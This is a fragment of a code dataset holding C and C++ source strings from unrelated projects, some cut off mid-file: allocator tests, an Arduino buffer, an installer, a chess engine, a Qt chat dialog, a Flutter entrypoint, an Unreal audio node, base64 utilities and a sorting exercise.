mi_free(cptr);\n  cptr = NULL;\n  return NULL;\n}\n\nstatic void test_large_migrate(void) {\n  auto t1 = std::thread(thread1_allocate);\n  t1.join();\n  auto t2 = std::thread(thread2_free);\n  t2.join();\n  /*\n  pthread_t thread1, thread2;\n\n  pthread_create(&thread1, NULL, &thread1_allocate, NULL);\n  pthread_join(thread1, NULL);\n\n  pthread_create(&thread2, NULL, &thread2_free, NULL);\n  pthread_join(thread2, NULL);\n  */\n  return;\n}\n#endif\n\n// issue 445\nstatic void strdup_test() {\n#ifdef _MSC_VER\n  char* s = _strdup(\"hello\\n\");\n  char* buf = NULL;\n  size_t len;\n  _dupenv_s(&buf, &len, \"MIMALLOC_VERBOSE\");\n  mi_free(buf);\n  mi_free(s);\n#endif\n}\n\n// Issue #202\nstatic void heap_no_delete_worker() {\n  mi_heap_t* heap = mi_heap_new();\n  void* q = mi_heap_malloc(heap, 1024); (void)(q);\n  // mi_heap_delete(heap); // uncomment to prevent assertion\n}\n\nstatic void heap_no_delete() {\n  auto t1 = std::thread(heap_no_delete_worker);\n  t1.join();\n}\n\n\n// Issue #697\nstatic void test_std_string",
    "/*\n * CustomDS.cpp implements the classes the classes for different \n * data structures used for different applications in the BioRehab Group.\n * \n * Author: Sivakumar Balasubramanian\n * Created on: August 15 2018\n * Updated on: September 06 2024\n */\n\n#include \"Arduino.h\"\n#include \"CustomDS.h\"\n\n// Buffer class definitions\nBuffer::Buffer() {\n  _inx = 0xFF;\n}\n\nvoid Buffer::add(float val) {\n    // Check if the buffer is empty. If so, fill the entire,\n    // buffer with the first value.\n    if (_inx == 0xFF) {\n        for (int i = 0; i < N; i++) {\n            _data[i] = val;\n        }\n        _inx = 0;\n    } else {\n        _inx += 1;\n        _inx = _inx & Nmask;    \n        _data[_inx] = val;\n    }\n}\n\nbool Buffer::isEmpty(void) {\n  return _inx == 0xFF;\n}\n\nfloat Buffer::val(byte pos) {\n  // Cap position to the max. possible value.\n  pos = (pos >= N) ? N - 1 : pos;\n  // Negative values get capped to 0. They will always\n  // return the current value.\n  pos = (pos < 0) ? 0 : pos;\n  return _data[(_inx - pos) & Nmask];\n}\n\n// OutDataBuffer class definitions\nOutDataBuffer4Float::OutDataBuffer4Float() {\n  _sz = 0;\n}\n\nvoid OutDataBuffer4Float::newPacket() {\n  _sz = 0;\n}\n\nvoid OutDataBuffer4Float::add(float num) {\n  _data[_sz++].num = num;\n}\n\nbyte OutDataBuffer4Float::sz() {\n  return _sz;\n}\n\nbyte OutDataBuffer4Float::getByte(byte inx) {\n  byte q = inx / 4;\n  byte r = inx % 4;\n  return _data[q].bytes[r];\n}\n",
    "#define SDL_MAIN_HANDLED\n#include <iostream>\n#include <string>\n#include <thread>\n#include <fstream>\n\n#include \"../ui/installer/app.hpp\"\n\nstatic std::string g_OldLauncherVersion;\n\nvoid parseArguments(int argc, char *argv[], std::string &path) {\n    for (int i = 1; i < argc; ++i) {\n        std::string arg = argv[i];\n\n        if (arg.find(\"--path=\") == 0) {\n            path = arg.substr(7);\n        }\n    }\n\n    if (path.empty()) {\n        path = g_InstallerData->g_DefaultInstallPath;\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    g_InstallerData = std::make_shared<VortexInstallerData>();\n    g_InstallerData->g_WorkingPath = g_InstallerData->g_DefaultInstallPath;\n\n    g_InstallerData->g_Action = \"vxuninstall\";\n    parseArguments(argc, argv, g_InstallerData->g_WorkingPath);\n\n\n    if (g_InstallerData->g_WorkingPath.empty())\n    {\n        g_InstallerData->g_WorkingPath = CookPath(\"\");\n        std::cout << \"Path derived from executable: \" << g_InstallerData->g_WorkingPath << std::endl;\n    }\n\n    std::cout << \"Action: \" << g_InstallerData->g_Action << std::endl;\n    std::cout << \"Path: \" << g_InstallerData->g_WorkingPath << std::endl;\n\n     std::string manifestPath = findManifestJson(g_InstallerData->g_WorkingPath);\n    if (!manifestPath.empty())\n    {\n        std::cout << \"Found manifest.json at: \" << manifestPath << std::endl;\n        \n    g_InstallerData->g_WorkingPath = manifestPath.substr(0, manifestPath.find_last_of(\"/\\\\\"));\n       \n    }\n    else\n    {\n        std::cerr << \"manifest.json not found!\" << std::endl;\n    }\n\n    std::thread mainThread([&]()\n                           { Cherry::Main(argc, argv); });\n\n\n    while (g_ApplicationRunning)\n    {\n    }\n\n    mainThread.join();\n\n    return 0;\n}\n",
    "//(c) MateBot_V2, Chess Engine\r\n//(c) Mate Csapo; August 2023\r\n//Source File\r\n\r\n//***PREAMBLE***\r\n//------------------------------------------------------------------------------------------------\r\n//Include iostream  \r\n#include <iostream>\r\n//Include file stream\r\n#include <fstream>\r\n//Include text alignment\r\n#include <iomanip>\r\n//Include time\r\n#include <ctime>\r\n//Include c++ sort() algorithm\r\n#include <algorithm>\r\n//For string parsing\r\n#include <string>\r\n//Vector Library\r\n#include <vector>\r\n//Header File\r\n#include \"MateBot_V2.hpp\"\r\n\r\n//Standard Namespace\r\nusing namespace std;\r\n//------------------------------------------------------------------------------------------------\r\n\r\n//***Board Storage***\r\n//------------------------------------------------------------------------------------------------\r\n//Define a public array to store chessboard\r\n// - [0][0] is top left square of black's side\r\nBoard_Square Board[8][8];\r\n\r\n//Initialize board at start of game\r\nvoid Board_Setup()\r\n{\r\n    //Initialize Black pieces\r\n    //Note top 2 rows as occupied by black\r\n    for (int row = 0; row <= 1; row++)\r\n    {\r\n        for (int column = 0; column <= 7; column++)\r\n        {\r\n            Board[row][column].Is_Occupied = true;\r\n            Board[row][column].Piece_Colour = 'B';\r\n        }\r\n    }\r\n    //Initialize top row\r\n    string Top_Row = \"RNBQKBNR\";\r\n    for (int column = 0; column <= 7; column++)\r\n    {\r\n        Board[0][column].Piece_Type = Top_Row[column];\r\n    }\r\n    //Initialize second row\r\n    for (int column = 0; column <= 7; column++)\r\n    {\r\n        Board[1][column].Piece_Type = 'P';\r\n    }\r\n\r\n    //Initialize empty squares\r\n    for (int row = 2; row <= 5; row++)\r\n    {\r\n        for (int column = 0; column <= 7; column++)\r\n        {\r\n            Board[row][column].Is_Occupied = false;\r\n        }\r\n    }\r\n\r\n    //Initialize White pieces\r\n    //Note bottom 2 rows as occupied by white\r\n    for (int row = 6; row <= 7; row++)\r\n    {\r\n        for (int column = 0; column <= 7; column++)\r\n        {\r\n            Board[row][column].Is_Occupied = true;\r\n            Board[row][column].Piece_Colour = 'W';\r\n        }\r\n    }\r\n    //Initialize sixth row\r\n    for (int column = 0; column <= 7; column++)\r\n    {\r\n        Board[6][column].Piece_Type = 'P';\r\n    }\r\n    //Initialize bottom row\r\n    string Bottom_Row = \"RNBQKBNR\";\r\n    for (int column = 0; column <= 7; column++)\r\n    {\r\n        Board[7][column].Piece_Type = Top_Row[column];\r\n    }\r\n}\r\n//------------------------------------------------------------------------------------------------\r\n\r\n//***Colour and Depth Storage***\r\n//------------------------------------------------------------------------------------------------\r\n//Global variable for storing which side MateBot is playing as (for UCI purposes; assumed to be B)\r\nchar MateBot_Playing_As = 'B';\r\n\r\n//Global variable for storing the current move # of the game; initialized to 0\r\nint Move_Number = 0;\r\n\r\n//global variable for storing total number of major pieces left on the board\r\nint Num_Major_Pieces_Left;\r\n\r\n//Recent move storage\r\n//storing recent moves to stop bot from playing 3-fold repititions.\r\nvector <Move> Moves_Played;\r\n//------------------------------------------------------------------------------------------------\r\n\r\n//***Search Diagnostics Global Variable Storage***\r\n//------------------------------------------------------------------------------------------------\r\n//Temp variable for measuring time\r\nint Total_Time_Temp;\r\n//Quantifyed measurements\r\nint Search_Time, Terminal_Nodes_Evaluated;\r\n//Time profile global vars\r\nint Pseudo_Legal_Time, Legal_Time, Move_Ordering_Time, Pos_Eval_Time;\r\n//Time profile temp var\r\nint Profile_Temp_Time;\r\n//file output var\r\nfstream fout;\r\n//------------------------------------------------------------------------------------------------\r\n\r\n// \r\n//***Piece +/ Positional Value Constants***\r\n//------------------------------------------------------------------------------------------------\r\n//Relative numerical value of each piece type for evaluating\r\n//their worths\r\nint Pawn_Value = 100;\r\nint Knight_Value = 320;\r\nint Bishop_Value = 330;\r\nint Rook_Value = 500;\r\nint Queen_Value = 900;\r\nint King_Value = 2000;\r\n//Note that king has a value of 0\r\n\r\n//Piece Square Lists\r\n//White Pieces\r\nint W_Pawn_PSL[64] = { 120, 120, 120, 120, 120, 120, 120, 120,\r\n60, 60, 60, 60, 60, 60, 60, 60,\r\n30, 30, 35, 40, 40, 35, 30, 30,\r\n25, 25, 31, 35, 35, 31, 25, 25,\r\n2, 12, 21, 34, 34, 21, 12, 2,\r\n0, 7, 17, 30, 30, 17, 7, 0,\r\n5, 0, -5, -15, -15, -5, 0, 5,\r\n0, 0, 0, 0, 0, 0, 0, 0 };\r\nint W_Knight_PSL[64] = { -50,-40,-30,-30,-30,-30,-40,-50,-40,-20,  0,  0,  0,  0,-20,-40, -30,  0, 10, 15, 15, 10,  0,-30, -30,  5, 15, 20, 20, 15,  5,-30, -30,  0, 15, 20, 20, 15,  0,-30, -30,  5, 10, 15, 15, 10,  5,-30, -40,-20,  0,  5,  5,  0,-20,-40, -50,-40,-30,-30,-30,-30,-40,-50, };\r\nint W_Bishop_PSL[64] = { -20,-10,-10,-10,-10,-10,-10,-20, -10,  0,  0,  0,  0,  0,  0,-10, -10,  0,  5, 10, 10,  5,  0,-10, -10,  5,  5, 10, 10,",
    "#include \"chatdialog.h\"\n#include \"ui_chatdialog.h\"\n#include <QAction>\n#include \"chatuserwid.h\"\n#include <QDebug>\n#include <vector>\n#include <QRandomGenerator>\n#include \"loadingdlg.h\"\n#include \"global.h\"\n#include \"ChatItemBase.h\"\n#include \"TextBubble.h\"\n#include \"PictureBubble.h\"\n#include \"MessageTextEdit.h\"\n#include \"chatuserlist.h\"\n#include \"grouptipitem.h\"\n#include \"invaliditem.h\"\n#include \"conuseritem.h\"\n#include \"lineitem.h\"\n#include \"tcpmgr.h\"\n#include \"usermgr.h\"\n\n\nChatDialog::ChatDialog(QWidget *parent) :\n    QDialog(parent),\n    ui(new Ui::ChatDialog),_b_loading(false),_mode(ChatUIMode::ChatMode),\n    _state(ChatUIMode::ChatMode),_last_widget(nullptr),_cur_chat_uid(0)\n{\n    ui->setupUi(this);\n\n    ui->add_btn->SetState(\"normal\",\"hover\",\"press\");\n    ui->add_btn->setProperty(\"state\",\"normal\");\n    QAction *searchAction = new QAction(ui->search_edit);\n    searchAction->setIcon(QIcon(\":/res/search.png\"));\n    ui->search_edit->addAction(searchAction,QLineEdit::LeadingPosition);\n    ui->search_edit->setPlaceholderText(QStringLiteral(\"\u641c\u7d22\"));\n\n\n    // \u521b\u5efa\u4e00\u4e2a\u6e05\u9664\u52a8\u4f5c\u5e76\u8bbe\u7f6e\u56fe\u6807\n    QAction *clearAction = new QAction(ui->search_edit);\n    clearAction->setIcon(QIcon(\":/res/close_transparent.png\"));\n    // \u521d\u59cb\u65f6\u4e0d\u663e\u793a\u6e05\u9664\u56fe\u6807\n    // \u5c06\u6e05\u9664\u52a8\u4f5c\u6dfb\u52a0\u5230LineEdit\u7684\u672b\u5c3e\u4f4d\u7f6e\n    ui->search_edit->addAction(clearAction, QLineEdit::TrailingPosition);\n\n    // \u5f53\u9700\u8981\u663e\u793a\u6e05\u9664\u56fe\u6807\u65f6\uff0c\u66f4\u6539\u4e3a\u5b9e\u9645\u7684\u6e05\u9664\u56fe\u6807\n    connect(ui->search_edit, &QLineEdit::textChanged, [clearAction](const QString &text) {\n        if (!text.isEmpty()) {\n            clearAction->setIcon(QIcon(\":/res/close_search.png\"));\n        } else {\n            clearAction->setIcon(QIcon(\":/res/close_transparent.png\")); // \u6587\u672c\u4e3a\u7a7a\u65f6\uff0c\u5207\u6362\u56de\u900f\u660e\u56fe\u6807\n        }\n\n    });\n\n    // \u8fde\u63a5\u6e05\u9664\u52a8\u4f5c\u7684\u89e6\u53d1\u4fe1\u53f7\u5230\u69fd\u51fd\u6570\uff0c\u7528\u4e8e\u6e05\u9664\u6587\u672c\n    connect(clearAction, &QAction::triggered, [this, clearAction]() {\n        ui->search_edit->clear();\n        clearAction->setIcon(QIcon(\":/res/close_transparent.png\")); // \u6e05\u9664\u6587\u672c\u540e\uff0c\u5207\u6362\u56de\u900f\u660e\u56fe\u6807\n        ui->search_edit->clearFocus();\n        //\u6e05\u9664\u6309\u94ae\u88ab\u6309\u4e0b\u5219\u4e0d\u663e\u793a\u641c\u7d22\u6846\n        ShowSearch(false);\n    });\n\n    ui->search_edit->SetMaxLength(15);\n\n    //\u8fde\u63a5\u52a0\u8f7d\u4fe1\u53f7\u548c\u69fd\n    connect(ui->chat_user_list, &ChatUserList::sig_loading_chat_user, this, &ChatDialog::slot_loading_chat_user);\n    addChatUserList();\n    //\u6a21\u62df\u52a0\u8f7d\u81ea\u5df1\u5934\u50cf\n    QString head_icon = UserMgr::GetInstance()->GetIcon();\n    QPixmap pixmap(head_icon); // \u52a0\u8f7d\u56fe\u7247\n    QPixmap scaledPixmap = pixmap.scaled( ui->side_head_lb->size(), Qt::KeepAspectRatio, Qt::SmoothTransformation); // \u5c06\u56fe\u7247\u7f29\u653e\u5230label\u7684\u5927\u5c0f\n    ui->side_head_lb->setPixmap(scaledPixmap); // \u5c06\u7f29\u653e\u540e\u7684\u56fe\u7247\u8bbe\u7f6e\u5230QLabel\u4e0a\n    ui->side_head_lb->setScaledContents(true); // \u8bbe\u7f6eQLabel\u81ea\u52a8\u7f29\u653e\u56fe\u7247\u5185\u5bb9\u4ee5\u9002\u5e94\u5927\u5c0f\n\n    ui->side_chat_lb->setProperty(\"state\",\"normal\");\n\n    ui->side_chat_lb->SetState(\"normal\",\"hover\",\"pressed\",\"selected_normal\",\"selected_hover\",\"selected_pressed\");\n\n    ui->side_contact_lb->SetState(\"normal\",\"hover\",\"pressed\",\"selected_normal\",\"selected_hover\",\"selected_pressed\");\n\n    AddLBGroup(ui->side_chat_lb);\n    AddLBGroup(ui->side_contact_lb);\n\n    connect(ui->side_chat_lb, &StateWidget::clicked, this, &ChatDialog::slot_side_chat);\n    connect(ui->side_contact_lb, &StateWidget::clicked, this, &ChatDialog::slot_side_contact);\n\n    //\u94fe\u63a5\u641c\u7d22\u6846\u8f93\u5165\u53d8\u5316\n    connect(ui->search_edit, &QLineEdit::textChanged, this, &ChatDialog::slot_text_changed);\n\n    ShowSearch(false);\n\n    //\u68c0\u6d4b\u9f20\u6807\u70b9\u51fb\u4f4d\u7f6e\u5224\u65ad\u662f\u5426\u8981\u6e05\u7a7a\u641c\u7d22\u6846\n    this->installEventFilter(this); // \u5b89\u88c5\u4e8b\u4ef6\u8fc7\u6ee4\u5668\n\n    //\u8bbe\u7f6e\u804a\u5929label\u9009\u4e2d\u72b6\u6001\n    ui->side_chat_lb->SetSelected(true);\n    //\u8bbe\u7f6e\u9009\u4e2d\u6761\u76ee\n    SetSelectChatItem();\n    //\u66f4\u65b0\u804a\u5929\u754c\u9762\u4fe1\u606f\n    SetSelectChatPage();\n\n    //\u8fde\u63a5\u52a0\u8f7d\u8054\u7cfb\u4eba\u7684\u4fe1\u53f7\u548c\u69fd\u51fd\u6570\n    connect(ui->con_user_list, &ContactUserList::sig_loading_contact_user,\n            this, &ChatDialog::slot_loading_contact_user);\n\n    //\u8fde\u63a5\u8054\u7cfb\u4eba\u9875\u9762\u70b9\u51fb\u597d\u53cb\u7533\u8bf7\u6761\u76ee\u7684\u4fe1\u53f7\n    connect(ui->con_user_list, &ContactUserList::sig_switch_apply_friend_page,\n            this,&ChatDialog::slot_switch_apply_friend_page);\n\n    //\u8fde\u63a5\u6e05\u9664\u641c\u7d22\u6846\u64cd\u4f5c\n    connect(ui->friend_apply_page, &ApplyFriendPage::sig_show_search, this, &ChatDialog::slot_show_search);\n\n    //\u4e3asearchlist \u8bbe\u7f6esearch edit\n    ui->search_list->SetSearchEdit(ui->search_edit);\n\n    //\u8fde\u63a5\u7533\u8bf7\u6dfb\u52a0\u597d\u53cb\u4fe1\u53f7\n    connect(TcpMgr::GetInstance().get(), &TcpMgr::sig_friend_apply, this, &ChatDialog::slot_apply_friend);\n\n    //\u8fde\u63a5\u8ba4\u8bc1\u6dfb\u52a0\u597d\u53cb\u4fe1\u53f7\n    connect(TcpMgr::GetInstance().get(), &TcpMgr::sig_add_auth_friend, this, &ChatDialog::slot_add_auth_friend);\n\n    //\u94fe\u63a5\u81ea\u5df1\u8ba4\u8bc1\u56de\u590d\u4fe1\u53f7\n    connect(TcpMgr::GetInstance().get(), &TcpMgr::sig_auth_rsp, this,\n            &ChatDialog::slot_auth_rsp);\n\n    //\u8fde\u63a5\u70b9\u51fb\u8054\u7cfb\u4ebaitem\u53d1\u51fa\u7684\u4fe1\u53f7\u548c\u7528\u6237\u4fe1\u606f\u5c55\u793a\u69fd\u51fd\u6570\n    connect(ui->con_user_list, &ContactUserList::sig_switch_friend_info_page,\n            this,&ChatDialog::slot_friend_info_page);\n\n    //\u8bbe\u7f6e\u4e2d\u5fc3\u90e8\u4ef6\u4e3achatpage\n    ui->stackedWidget->setCurrentWidget(ui->chat_page);\n\n\n    //\u8fde\u63a5searchlist\u8df3\u8f6c\u804a\u5929\u4fe1\u53f7\n    connect(ui->search_list, &SearchList::sig_jump_chat_item, this, &ChatDialog::slot_jump_chat_item);\n\n    //\u8fde\u63a5\u597d\u53cb\u4fe1\u606f\u754c\u9762\u53d1\u9001\u7684\u70b9\u51fb\u4e8b\u4ef6\n    connect(ui->friend_info_page, &FriendInfoPage::sig_jump_chat_item, this,\n            &ChatDialog::slot_jump_chat_item_from_infopage);\n\n    //\u8fde\u63a5\u804a\u5929\u5217\u8868\u70b9\u51fb\u4fe1\u53f7\n    connect(ui->chat_user_list, &QListWidget::itemClicked, this, &Ch",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sneaker_shop\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"MetasoundBranches/Public/MetasoundSahBankNode.h\"\n#include \"MetasoundExecutableOperator.h\"     // TExecutableOperator class\n#include \"MetasoundPrimitives.h\"             // ReadRef and WriteRef descriptions for bool, int32, float, and string\n#include \"MetasoundNodeRegistrationMacro.h\"  // METASOUND_LOCTEXT and METASOUND_REGISTER_NODE macros\n#include \"MetasoundStandardNodesNames.h\"     // StandardNodes namespace\n#include \"MetasoundFacade.h\"                 // FNodeFacade class, eliminates the need for a fair amount of boilerplate code\n#include \"MetasoundParamHelper.h\"            // METASOUND_PARAM and METASOUND_GET_PARAM family of macros\n\n// Required for ensuring the node is supported by all languages in engine. Must be unique per MetaSound.\n#define LOCTEXT_NAMESPACE \"MetasoundStandardNodes_SahBankNode\"\n\nnamespace Metasound\n{\n    // Vertex Names - define the node's inputs and outputs here\n    namespace SahBankNodeNames\n    {\n        METASOUND_PARAM(InputSignal1, \"Signal 1\", \"Input signal to sample 1.\");\n        METASOUND_PARAM(InputTrigger1, \"Trigger 1\", \"Trigger signal 1.\");\n        METASOUND_PARAM(InputSignal2, \"Signal 2\", \"Input signal to sample 2.\");\n        METASOUND_PARAM(InputTrigger2, \"Trigger 2\", \"Trigger signal 2.\");\n        METASOUND_PARAM(InputSignal3, \"Signal 3\", \"Input signal to sample 3.\");\n        METASOUND_PARAM(InputTrigger3, \"Trigger 3\", \"Trigger signal 3.\");\n        METASOUND_PARAM(InputSignal4, \"Signal 4\", \"Input signal to sample 4.\");\n        METASOUND_PARAM(InputTrigger4, \"Trigger 4\", \"Trigger signal 4.\");\n        METASOUND_PARAM(InputThreshold, \"Threshold\", \"Threshold for triggers.\");\n\n        METASOUND_PARAM(OutputSignal1, \"Output 1\", \"Sampled output signal.\");\n        METASOUND_PARAM(OutputSignal2, \"Output 2\", \"Sampled output signal.\");\n        METASOUND_PARAM(OutputSignal3, \"Output 3\", \"Sampled output signal.\");\n        METASOUND_PARAM(OutputSignal4, \"Output 4\", \"Sampled output signal.\");\n    }\n\n    // Operator Class - defines the way the node is described, created and executed\n    class FSahBankOperator : public TExecutableOperator<FSahBankOperator>\n    {\n    public:\n        // Constructor\n        FSahBankOperator(\n            const FAudioBufferReadRef& InSignal1,\n            const FAudioBufferReadRef& InTrigger1,\n            const FAudioBufferReadRef& InSignal2,\n            const FAudioBufferReadRef& InTrigger2,\n            const FAudioBufferReadRef& InSignal3,\n            const FAudioBufferReadRef& InTrigger3,\n            const FAudioBufferReadRef& InSignal4,\n            const FAudioBufferReadRef& InTrigger4,\n            const FFloatReadRef& InThreshold)\n            : InputSignal1(InSignal1)\n            , InputTrigger1(InTrigger1)\n            , InputSignal2(InSignal2)\n            , InputTrigger2(InTrigger2)\n            , InputSignal3(InSignal3)\n            , InputTrigger3(InTrigger3)\n            , InputSignal4(InSignal4)\n            , InputTrigger4(InTrigger4)\n            , InputThreshold(InThreshold)\n            , OutputSignal1(FAudioBufferWriteRef::CreateNew(InSignal1->Num()))\n            , OutputSignal2(FAudioBufferWriteRef::CreateNew(InSignal2->Num()))\n            , OutputSignal3(FAudioBufferWriteRef::CreateNew(InSignal3->Num()))\n            , OutputSignal4(FAudioBufferWriteRef::CreateNew(InSignal4->Num()))\n            , SampledValue1(0.0f)\n            , SampledValue2(0.0f)\n            , SampledValue3(0.0f)\n            , SampledValue4(0.0f)\n            , PreviousTriggerValue1(0.0f)\n            , PreviousTriggerValue2(0.0f)\n            , PreviousTriggerValue3(0.0f)\n            , PreviousTriggerValue4(0.0f)\n        {\n        }\n\n        // Helper function for constructing vertex interface\n        static const FVertexInterface& DeclareVertexInterface()\n        {\n            using namespace SahBankNodeNames;\n\n            static const FVertexInterface Interface(\n                FInputVertexInterface(\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputSignal1)),\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputTrigger1)),\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputSignal2)),\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputTrigger2)),\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputSignal3)),\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputTrigger3)),\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputSignal4)),\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputTrigger4)),\n                    TInputDataVertexModel<float>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputThreshold))\n                ),\n                FOutputVertexInterface(\n                    TOutputDataVertexModel<FAu",
    "#include \"Utility.hpp\"\n#include <memory>\n\n#include <string.h>\n#include <stdio.h>\n#include <limits.h>\n\n#define FF_ARRAY_ELEMS(a) (sizeof(a) / sizeof((a)[0]))\n#define AV_BASE64_SIZE(x) (((x) + 2) / 3 * 4 + 1)\n\nusing namespace std;\n\nstatic const uint8_t map2[] =\n    {\n        0x3e, 0xff, 0xff, 0xff, 0x3f, 0x34, 0x35, 0x36,\n        0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0xff,\n        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x01,\n        0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,\n        0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,\n        0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,\n        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x1a, 0x1b,\n        0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23,\n        0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b,\n        0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33};\n\nint av_base64_decode(uint8_t *out, const char *in, int out_size)\n{\n    int i, v;\n    uint8_t *dst = out;\n\n    v = 0;\n    for (i = 0; in[i] && in[i] != '='; i++)\n    {\n        unsigned int index = in[i] - 43;\n        if (index >= FF_ARRAY_ELEMS(map2) || map2[index] == 0xff)\n            return -1;\n        v = (v << 6) + map2[index];\n        if (i & 3)\n        {\n            if (dst - out < out_size)\n            {\n                *dst++ = v >> (6 - 2 * (i & 3));\n            }\n        }\n    }\n\n    return dst - out;\n}\n\nchar *av_base64_encode_l(char *out, int *out_size, const uint8_t *in, int in_size)\n{\n    static const char b64[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    char *ret, *dst;\n    unsigned i_bits = 0;\n    int i_shift = 0;\n    int bytes_remaining = in_size;\n\n    if ((size_t)in_size >= UINT_MAX / 4 || *out_size < AV_BASE64_SIZE(in_size))\n    {\n        return nullptr;\n    }\n    ret = dst = out;\n    while (bytes_remaining)\n    {\n        i_bits = (i_bits << 8) + *in++;\n        bytes_remaining--;\n        i_shift += 8;\n\n        do\n        {\n            *dst++ = b64[(i_bits << 6 >> i_shift) & 0x3f];\n            i_shift -= 6;\n        } while (i_shift > 6 || (bytes_remaining == 0 && i_shift > 0));\n    }\n    while ((dst - ret) & 3)\n        *dst++ = '=';\n    *dst = '\\0';\n\n    *out_size = dst - out;\n    return ret;\n}\n\nchar *av_base64_encode(char *out, int out_size, const uint8_t *in, int in_size)\n{\n    return av_base64_encode_l(out, &out_size, in, in_size);\n}\n\nstring utils::EncodeBase64(const string &txt)\n{\n    if (txt.empty())\n    {\n        return \"\";\n    }\n    int size = AV_BASE64_SIZE(txt.size()) + 10;\n    string ret;\n    ret.resize(size);\n\n    if (!av_base64_encode_l((char *)ret.data(), &size, (const uint8_t *)txt.data(), txt.size()))\n    {\n        return \"\";\n    }\n    ret.resize(size);\n    return ret;\n}\n\nstring utils::DecodeBase64(const string &txt)\n{\n    if (txt.empty())\n    {\n        return \"\";\n    }\n    string ret;\n    ret.resize(txt.size() * 3 / 4 + 10);\n    auto size = av_base64_decode((uint8_t *)ret.data(), txt.data(), ret.size());\n\n    if (size <= 0)\n    {\n        return \"\";\n    }\n    ret.resize(size);\n    return ret;\n}\n\nvector<string> utils::Split(const string &s, const char *delim)\n{\n    vector<string> ret;\n    size_t last = 0;\n    auto index = s.find(delim, last);\n    while (index != string::npos)\n    {\n        if (index - last > 0)\n        {\n            ret.push_back(s.substr(last, index - last));\n        }\n        last = index + strlen(delim);\n        index = s.find(delim, last);\n    }\n    if (!s.size() || s.size() - last > 0)\n    {\n        ret.push_back(s.substr(last));\n    }\n    return ret;\n}",
    "#include <algorithm>\n#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nint sum(int number) {\n    int sum = 0;\n    while (number > 0) {\n        sum += number%10;\n        number /= 10;\n    }\n    return sum;\n}\n\nint size(int number) {\n    int counter = 0;\n    while (number > 0) {\n        number /= 10;\n        counter++;\n    }\n    return counter;\n}\n\nclass SortBySize {\npublic:\n    bool operator()(int a, int b) const {\n        return size(a) > size(b);\n    }\n};\n\nint main() {\n\n    vector<int> vector = {11, 27, 7, 60, 301, 10, 20, 1001};\n\n    cout << \"Stan poczatkowy:\" << endl;\n    for_each (vector.begin(), vector.end(), [](int num) {\n       cout << num << \" \";\n    });\n\n    cout << endl << endl;\n\n    cout << \"Liczby posortowane rosnaco wedlug sumy cyfr w liczbie (iterator): \" << endl;\n    sort(vector.begin(), vector.end(), [](int a, int b) {\n       return sum(a) < sum(b);\n    });\n    for_each (vector.begin(), vector.end(), [](int num) {\n       cout << num << \" \";\n    });\n\n    cout << endl;\n\n    cout << \"\\nLiczby posortowane malejaco wedlug liczby cyfr (funktor): \" << endl;\n    sort(vector.begin(), vector.end(), SortBySize());\n    for_each(vector.begin(), vector.end(), [](int num) {\n        cout << num << \" \";\n    });\n\n    cout << endl << endl;\n\n    cout << \"Liczby posortowane rosnaco wedlug sumy cyfr w liczbie (nazwana lambda)\" << endl;\n    auto sortBySumLambda = [](int a, int b) {\n        return sum(a) < sum(b);\n    };\n    sort(vector.begin(), vector.end(), sortBySumLambda);\n    for_each (vector.begin(), vector.end(), [](int num) {\n       cout << num << \" \";\n    });\n\n    cout << endl;\n\n    cout << \"\\nLiczby posortowane malejaco wedlug liczby cyfr (nienazwana lambda): \" << endl;\n    sort(vector.begin(), vector.end(),\n        [](int a, int b){ return size(a) > size(b);});\n    for_each (vector.begin(), vector.end(), [](int num) {\n       cout << num << \" \";\n    });\n\n    return 0;\n}\n",
